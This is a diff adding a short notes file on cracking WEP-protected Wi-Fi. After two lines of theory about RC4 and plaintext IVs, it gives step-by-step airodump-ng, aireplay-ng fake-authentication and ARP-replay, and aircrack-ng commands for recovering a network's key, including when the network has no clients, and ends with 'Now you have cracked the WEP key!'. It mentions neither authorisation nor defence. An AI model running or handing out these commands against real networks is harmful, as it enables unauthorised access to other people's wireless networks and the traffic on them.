@@ -1,0 +1,36 @@
+//WEP Cracking theory - oldest - but still used
+It uses a RC4 algorithm where each packet is encrypted at the AP and then decrypted at the client
+IV are in the packets as plain est. So the more IV we collect the more likely we can crack the key.
+
+//WEP Cracking Basic
+
+//First see all networks
+
+airodump-ng mon0
+
+airodump-ng -bssid (MACNETWORKADRESS) --channel (NETWORKCHANNEL) --write basic-test-ap mon0
+
+//Let it collect some data
+//Try to crack the network with the data you have connected
+// Launch a new terminal
+
+aircrack-ng basic-test-ap-01.cap
+
+//Once it has found the key you just remove the dots in between the characters
+
+//Now you have cracked the WEP key!
+
+
+//////How to crack WEP when there are no clients or little traffic
+
+//First you must authenticate your device with the router DO THE FOLLOWING ALONG SIDE EACH OTHER
+
+aireplay-ng --fakeauth 0 -a (NETWORKMACADRESS) -h (YOURMACADRESS) mon0
+
+airodump-ng --bssid (NETWORKMACADRESS) --channel (NETWORKCHANNEL) --write arp-request-reply mon0
+
+aireplay-ng --arpreplay -b (NETWORKMACADRESS) -h (YOURMACADRESS) mon0
+
+//Next to crack
+
+aircrack-ng arp-request-reply-01.cap
